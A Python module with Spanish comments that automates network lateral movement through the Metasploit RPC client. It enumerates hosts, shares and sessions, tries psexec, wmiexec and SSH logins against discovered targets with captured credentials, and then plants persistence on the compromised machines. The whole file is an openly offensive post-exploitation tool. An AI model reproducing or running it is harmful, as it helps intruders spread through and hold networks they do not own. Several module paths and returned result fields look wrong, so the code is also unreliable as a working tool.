#!/usr/bin/env python3

import logging
import subprocess
import os
import time
import json
from typing import Dict, List
from pymetasploit3.msfrpc import MsfRpcClient

logger = logging.getLogger(__name__)

class LateralMovement:
    def __init__(self, msf_client: MsfRpcClient, config: Dict):
        """Inicializa el módulo de movimiento lateral"""
        self.msf_client = msf_client
        self.config = config
        self.temp_dir = os.path.join(os.path.dirname(__file__), "..", "..", "temp")
        os.makedirs(self.temp_dir, exist_ok=True)
    
    def perform_lateral_movement(self, target: str, credentials: Dict = None) -> Dict:
        """Realiza movimiento lateral inteligente"""
        result = {
            "successful_movements": [],
            "failed_movements": [],
            "discovered_hosts": [],
            "compromised_hosts": []
        }
        
        try:
            # Descubrir hosts accesibles
            hosts = self._discover_hosts(target)
            result["discovered_hosts"] = hosts
            
            # Analizar vectores de movimiento
            vectors = self._analyze_movement_vectors(target, hosts)
            
            # Realizar movimiento lateral
            for vector in vectors:
                movement_result = self._execute_movement(target, vector)
                if movement_result.get("success"):
                    result["successful_movements"].append(movement_result)
                    result["compromised_hosts"].append(movement_result.get("target"))
                else:
                    result["failed_movements"].append(movement_result)
            
            # Establecer persistencia
            persistence_results = self._establish_persistence(result["compromised_hosts"])
            result["persistence"] = persistence_results
        
        except Exception as e:
            logger.error(f"Error en movimiento lateral: {str(e)}")
        
        return result
    
    def _discover_hosts(self, target: str) -> List[Dict]:
        """Descubre hosts accesibles para movimiento lateral"""
        hosts = []
        
        try:
            if not self.msf_client:
                return hosts
            
            # Usar módulos de Metasploit para descubrir hosts
            modules = [
                "post/windows/gather/enum_computers",
                "post/linux/gather/enum_hosts"
            ]
            
            for module in modules:
                try:
                    # Configurar módulo
                    discover_module = self.msf_client.modules.use('post', module)
                    discover_module['SESSION'] = target
                    
                    # Ejecutar módulo
                    result = discover_module.execute()
                    
                    if result and "hosts" in result:
                        hosts.extend(result["hosts"])
                
                except Exception as e:
                    logger.error(f"Error al ejecutar módulo {module}: {str(e)}")
        
        except Exception as e:
            logger.error(f"Error al descubrir hosts: {str(e)}")
        
        return hosts
    
    def _analyze_movement_vectors(self, target: str, hosts: List[Dict]) -> List[Dict]:
        """Analiza vectores de movimiento lateral"""
        vectors = []
        
        try:
            if not self.msf_client:
                return vectors
            
            # Usar módulos de Metasploit para analizar vectores
            modules = [
                "post/windows/gather/enum_shares",
                "post/windows/gather/enum_sessions",
                "post/linux/gather/enum_network"
            ]
            
            for module in modules:
                try:
                    # Configurar módulo
                    vector_module = self.msf_client.modules.use('post', module)
                    vector_module['SESSION'] = target
                    
                    # Ejecutar módulo
                    result = vector_module.execute()
                    
                    if result and "vectors" in result:
                        vectors.extend(result["vectors"])
                
                except Exception as e:
                    logger.error(f"Error al ejecutar módulo {module}: {str(e)}")
        
        except Exception as e:
            logger.error(f"Error al analizar vectores: {str(e)}")
        
        return vectors
    
    def _execute_movement(self, target: str, vector: Dict) -> Dict:
        """Ejecuta movimiento lateral"""
        result = {
            "success": False,
            "target": vector.get("target", ""),
            "method": vector.get("method", ""),
            "details": {}
        }
        
        try:
            if not self.msf_client:
                return result
            
            # Usar módulos de Metasploit para movimiento lateral
            modules = [
                "exploit/windows/smb/psexec",
                "exploit/windows/smb/wmiexec",
                "exploit/linux/ssh/ssh_login"
            ]
            
            for module in modules:
                try:
                    # Configurar módulo
                    move_module = self.msf_client.modules.use('exploit', module)
                    move_module['RHOSTS'] = vector.get("target", "")
                    move_module['USERNAME'] = vector.get("username", "")
                    move_module['PASSWORD'] = vector.get("password", "")
                    
                    # Ejecutar módulo
                    move_result = move_module.execute()
                    
                    if move_result and move_result.get("success"):
                        result["success"] = True
                        result["details"] = move_result
                        break
                
                except Exception as e:
                    logger.error(f"Error al ejecutar módulo {module}: {str(e)}")
        
        except Exception as e:
            logger.error(f"Error al ejecutar movimiento: {str(e)}")
        
        return result
    
    def _establish_persistence(self, hosts: List[str]) -> Dict:
        """Establece persistencia en hosts comprometidos"""
        persistence_results = {
            "successful": [],
            "failed": []
        }
        
        try:
            if not self.msf_client:
                return persistence_results
            
            # Usar módulos de Metasploit para persistencia
            modules = [
                "post/windows/manage/persistence_exe",
                "post/linux/manage/sshkey_persistence"
            ]
            
            for host in hosts:
                for module in modules:
                    try:
                        # Configurar módulo
                        persist_module = self.msf_client.modules.use('post', module)
                        persist_module['SESSION'] = host
                        
                        # Ejecutar módulo
                        result = persist_module.execute()
                        
                        if result and result.get("success"):
                            persistence_results["successful"].append({
                                "host": host,
                                "method": module,
                                "details": result
                            })
                        else:
                            persistence_results["failed"].append({
                                "host": host,
                                "method": module,
                                "error": result.get("error", "Unknown error")
                            })
                    
                    except Exception as e:
                        logger.error(f"Error al ejecutar módulo {module}: {str(e)}")
        
        except Exception as e:
            logger.error(f"Error al establecer persistencia: {str(e)}")
        
        return persistence_results 